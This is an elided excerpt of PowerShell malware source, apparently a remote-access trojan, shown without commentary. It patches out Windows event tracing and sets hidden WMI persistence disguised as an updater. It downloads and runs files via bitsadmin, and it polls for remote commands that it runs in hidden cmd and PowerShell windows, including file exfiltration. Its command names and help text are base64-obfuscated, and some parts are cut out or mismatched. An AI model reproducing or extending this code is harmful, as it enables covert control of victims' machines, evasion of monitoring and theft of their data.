...
function BypEtw {
    try {
        ...
        $Adr = [Wn32]::GetProcAddress($Ll, (d('RXhDb21wYW5k')))  # EtwEventWrite stub
        $p = 0
...
function StPrstnc {
    ...
    $Flt.InsertInto($WmiNs)

    $WmiBnd = [wmiclass]"root\subscription:__FilterToConsumerBinding"
    $Bnd = $WmiBnd.CreateInstance()
    $Bnd.Filter = $Flt
    $Bnd.Consumer = [wmiclass]"root\subscription:CommandLineEventConsumer".CreateInstance()
    $Bnd.Consumer.Name = (d('VXBkYXRlckNvbnN1bWVy'))
    $Bnd.Consumer.CommandLineTemplate = $WmiAct
    $Bnd.InsertInto($WmiBnd)
...
function InvDl {
    ...
    try {
        bitsadmin /transfer "Jb$(Get-Random)" /download /priority normal $url $path > $null
        if ($exec) {
    ...
    while ($true) {
        try {
            ...
            foreach ($upd in $upds.result) {
                ...
                $prts = $txt.Substring(1).Split(' ', [StringSplitOptions]::RemoveEmptyEntries)
                $cmdNm = $prts[0].ToLower()
                $rawArgs = $txt.Substring($txt.IndexOf($prts[0]) + $prts[0].Length + 1).Trim()
                $args = $rawArgs -split ' ' | Where { $_ }
                ...
                if ($cmdNm -eq d('Y21k')) {  # cmd
                    ...
                    $prcs = Start-Process cmd.exe -ArgumentList "/c $fullCmd" -WindowStyle Hidden -PassThru -RedirectStandardOutput $tmpOt -RedirectStandardError $tmpEr -Wait -NoNewWindow
                ...
                if ($cmdNm -eq d('cHM=')) {  # ps
                    ...
                    $psCmd = "-ExecutionPolicy By -Command `"$fullCmd`""
                    $prcs = Start-Process powershell.exe -ArgumentList $psCmd -WindowStyle Hidden -PassThru -RedirectStandardOutput $tmpOt -RedirectStandardError $tmpEr -Wait -NoNewWindow
                ...
                if ($cmdNm -eq d('aGVscA==')) {  # help
                    ...
                    $hlps = @{
                        ...
                        d('cHM=') = d('RXhlYyBQUyAoYnlwYXNzZWQ6IC9wcyBHZXQtUHJvY2VzcyBJRF0=')
                        d('ZG93bmxvYWQ=') = d('RmV0Y2ggZmlsZTogL2Rvd25sb2FkIFtVUkxdIFtQQVRIXSBbZXhlY10gW0lEXQ==')
                        d('dXBsb2Fk') = d('RXhmaWwgZmlsZTogL3VwbG9hZCBbUEFUSA1bSUQ=') 
